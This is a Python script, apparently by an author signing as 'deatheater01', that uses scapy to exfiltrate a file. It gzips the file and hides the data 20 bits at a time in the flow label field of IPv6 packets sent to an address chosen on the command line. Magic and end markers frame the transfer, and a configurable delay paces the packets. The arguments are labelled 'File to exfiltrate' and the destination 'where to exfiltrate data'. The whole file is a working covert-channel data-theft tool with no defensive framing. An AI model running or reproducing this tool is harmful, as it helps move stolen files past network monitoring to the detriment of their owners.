import argparse

from scapy.all import *
from scapy.layers.inet6 import IPv6


class Sender:
    MAGIC_VALUE = "LO"
    END_VALUE = "BEHOLD"
    PACKET_LEN = 20

    def __init__(self, input_file, destination, interval_ms):
        self.input_file = input_file
        self.destination = destination
        self.interval_ms = interval_ms

        with open(self.input_file, 'rb') as f:
            data = f.read()

        self.raw_bits = self.prepare_data(data)

    @staticmethod
    def bitfield(n):
        
        bits = [int(digit) for digit in bin(n)[2:]]
        padded_bits = [0] * (8 - len(bits)) + bits
        return padded_bits

    def prepare_data(self, data):
        
        out = io.BytesIO()
        with gzip.GzipFile(fileobj=out, mode="w") as f:
            f.write(data)
        data = out.getvalue()

        raw_bits = []
        for c in data:
            raw_bits.extend(self.bitfield(c))

        return raw_bits

    def send(self):
        pos = 0
        seq = 0
        num_bits_to_send = len(self.raw_bits)
        print(f"Sending {num_bits_to_send // 8} bytes ({num_bits_to_send} bits) "
              f"in {1 + num_bits_to_send // self.PACKET_LEN} IPv6 packets...")

        while pos < num_bits_to_send:
            payload = self.raw_bits[pos:min(num_bits_to_send, pos + self.PACKET_LEN)]

            payload_int = int("".join([str(b) for b in payload]), 2)

            ipv6_layer = IPv6(dst=self.destination, fl=payload_int)
            raw_layer = Raw(load=self.MAGIC_VALUE + "_" + str(num_bits_to_send) + "_" + str(seq))
            pkt = ipv6_layer / raw_layer

            
            send(pkt, verbose=False)
            seq += 1
            pos += self.PACKET_LEN

            sys.stderr.write('.')
            if seq % 50 == 0:
                sys.stderr.write('\n')
            sys.stderr.flush()

            
            time.sleep(self.interval_ms / 1000.0)

        pkt = IPv6(dst=self.destination) / Raw(load=self.END_VALUE)
        send(pkt, verbose=False)


def main():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument(
        "input_file",
        help="File to exfiltrate"
    )

    parser.add_argument(
        "destination",
        help="IPv6 address where to exfiltrate data"
    )

    parser.add_argument(
        "--packet-sending-interval-ms",
        dest="sending_interval",
        type=float,
        default=10,
        required=False,
        help='Number of milliseconds to wait between each IPv6 packet to send',
        
    )

    args = parser.parse_args()
    sender = Sender(args.input_file, args.destination, args.sending_interval)
    sender.send()
    print("\ndone", file=sys.stderr)


if __name__ == "__main__":
    print("""
███████╗██╗░░░██╗██████╗░░█████╗░░██████╗████████╗░█████╗░░██████╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██████╔╝██║░░██║╚█████╗░░░░██║░░░██║░░██║╚█████╗░
██╔══╝░░░╚████╔╝░██╔══██╗██║░░██║░╚═══██╗░░░██║░░░██║░░██║░╚═══██╗
███████╗░░╚██╔╝░░██║░░██║╚█████╔╝██████╔╝░░░██║░░░╚█████╔╝██████╔╝
╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░

    -deatheater01""")
    main()
